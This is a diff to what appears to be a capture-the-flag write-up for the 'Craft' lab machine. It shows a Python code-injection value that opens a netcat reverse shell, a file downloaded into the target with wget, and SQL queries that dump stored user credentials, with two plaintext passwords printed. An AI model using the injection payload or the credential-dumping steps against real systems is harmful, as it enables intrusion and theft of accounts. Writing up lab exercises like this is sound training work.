@@ -133,10 +133,39 @@ brew_dict['abv'] = '__import__(\"os\").system(\"nc 10.10.15.206 10000 \-e \/bin\
 ```
 And it worked!
 
+![Screenshot from 2019-08-04 21-53-34](https://user-images.githubusercontent.com/46615118/62869104-c6769d00-bcdc-11e9-94b0-a23006f13ca1.jpg)
+
+But, I couldn't do much with this shell. Many of the commands on a normal linux install were missing. In the `/root` folder I found a hidden docker file; I am probably in a container. I found I could run the `dbtest.py` file, seen in the above screenshot. That turned out to be super-convienient. If you had looked through the entire repo earlier, you would have seen the `models.py` file in the `craft_api/database` folder.
+
+-code snippet of models.py-
+
+We can see from the [url](https://flask-sqlalchemy.palletsprojects.com/en/2.x/quickstart/#simple-relationships) in the comments that this code creates a database with the tables `brew` and `user`. I copied and modified my local copy of `dbtest.py` to try and steal creds from the `user` table. I mentioned earlier that most of the normal linux commads were missing, but `wget` was still available. Nice. I served my modified file to the craft box with `python -m SimpleHTTPServer 10000` and used `wget` to download.
+
+```python
+sql = "SELECT * FROM `user`
+```
+
+Gave me Dinesh's creds, which we already have. Surely this wasn't only creds avaiable in this database. Why was this the case?I even tried adding `LIMIT 2` and it still only leaked Dinesh. I have Dinesh's `id` in the database, I tried excluding that `id` with the below query and got `ebachman`'s creds.
+
+```python
+sql = "SELECT `id`,`username`,`password` FROM `user` WHERE `id` != 1"
+
+# ebachman:llJ77D8QFkLPQB
+```
+
+I tried this credential in the api and on gogs.craft.htb, but nothing interesting was noted. I also tried ssh'ing into the box with those creds, but was denied entry. I looked for more credentials in the database. This next query returned `gilfoyle`'s creds
+
+```python
+sql = "SELECT `id`,`username`,`password` FROM `user` WHERE `id` != 1 AND `id` != 4"
+
+# gilfoyle:ZEU3N8WNM2rh4T
+```
+I checked for more creds by exclusion of `id` and `username`, but none were returned.
 
 
 ### Lessons Learned
 - learned a lot about modules, packages, and `import` in python. This was nice.
+- settings.py
 - I read almost every bit of code in this project looking for ways to leak data. It helped out a ton.
 - I am starting to develop a good methodology for note-taking. A bit of refining is needed, but I like how I can organizedata in cherrytree.
 
